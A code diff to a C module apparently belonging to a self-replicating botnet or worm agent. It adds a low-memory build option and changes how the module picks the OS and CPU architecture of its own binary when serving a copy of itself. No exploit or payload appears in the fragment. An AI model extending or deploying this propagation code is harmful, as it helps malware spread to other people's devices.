@@ -1,4 +1,5 @@
 #include "htbt.h"
+#include "config.h"
 #include "util_rt.h"
 #include "protocol.h"
 #include "llist.h"
@@ -47,7 +48,9 @@ static const struct timespec HTBT_CHILD_SPAWN_TIMEOUT = { 30, 0 }; // 30s
 static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s
 
 static const size_t HTBT_STDIO_IB_SIZE[] = {
+#if !PRNE_USE_MIN_MEM
 	PRNE_HTBT_STDIO_LEN_MAX,
+#endif
 	512,
 	0
 };
@@ -337,8 +340,20 @@ static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
 static bool htbt_alloc_slv_iobuf (htbt_slv_ctx_t *ctx) {
 #define OPT_SIZE 2048
 	static const size_t ALLOC_MAT[2][3] = {
-		{ OPT_SIZE, PRNE_HTBT_PROTO_MIN_BUF, 0 },
-		{ OPT_SIZE, PRNE_HTBT_PROTO_SUB_MIN_BUF, 0 }
+		{
+#if !PRNE_USE_MIN_MEM
+			OPT_SIZE,
+#endif
+			PRNE_HTBT_PROTO_MIN_BUF,
+			0
+		},
+		{
+#if !PRNE_USE_MIN_MEM
+			OPT_SIZE,
+#endif
+			PRNE_HTBT_PROTO_SUB_MIN_BUF,
+			0
+		}
 	};
 	prne_static_assert(
 		OPT_SIZE >= PRNE_HTBT_PROTO_MIN_BUF &&
@@ -1826,9 +1841,9 @@ static bool htbt_slv_srv_rcb (
 	int32_t err = 0;
 	prne_pack_rc_t prc;
 	prne_bin_rcb_ctx_t rcb_ctx;
+	prne_bin_host_t target, started;
 	prne_iobuf_t rcb_ib;
 	pth_event_t ev = NULL;
-	prne_arch_t started_arch;
 	ssize_t io_ret;
 	int rcb_err = 0;
 	prne_htbt_stdio_t data_f;
@@ -1863,37 +1878,39 @@ static bool htbt_slv_srv_rcb (
 		goto STATUS_END;
 	}
 
-	if (rcb_f.arch == PRNE_ARCH_NONE) {
-		rcb_f.arch = ctx->rcb->self;
+	if (rcb_f.self) {
+		target.os = ctx->rcb->self.os;
+		target.arch = ctx->rcb->self.arch;
+	}
+	else {
+		target.os = rcb_f.os;
+		target.arch = rcb_f.arch;
 	}
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		prne_dbgpf(
 			HTBT_NT_SLV"@%"PRIuPTR": starting rcb self=%02X target=%02X"
 			" compat(%s)\n",
 			(uintptr_t)ctx,
-			ctx->rcb->self,
-			rcb_f.arch,
+			ctx->rcb->self.arch,
+			target.arch,
 			rcb_f.compat ? "*" : " ");
 	}
 	prc = prne_start_bin_rcb_compat(
 		&rcb_ctx,
-		rcb_f.arch,
-		ctx->rcb->self,
+		target,
+		&ctx->rcb->self,
 		ctx->rcb->m_self,
 		ctx->rcb->self_len,
 		ctx->rcb->exec_len,
 		ctx->rcb->m_dv,
 		ctx->rcb->dv_len,
 		ctx->rcb->ba,
-		&started_arch);
+		&started);
 	if (prc != PRNE_PACK_RC_OK) {
 		htbt_slv_set_pack_err(prc, errno, &status, &err);
 		goto STATUS_END;
 	}
-	if (!rcb_f.compat &&
-		rcb_f.arch != PRNE_ARCH_NONE &&
-		rcb_f.arch != started_arch)
-	{
+	if (!rcb_f.compat && !prne_eq_bin_host(&target, &started)) {
 		htbt_slv_set_pack_err(PRNE_PACK_RC_NO_ARCH, 0, &status, &err);
 		goto STATUS_END;
 	}
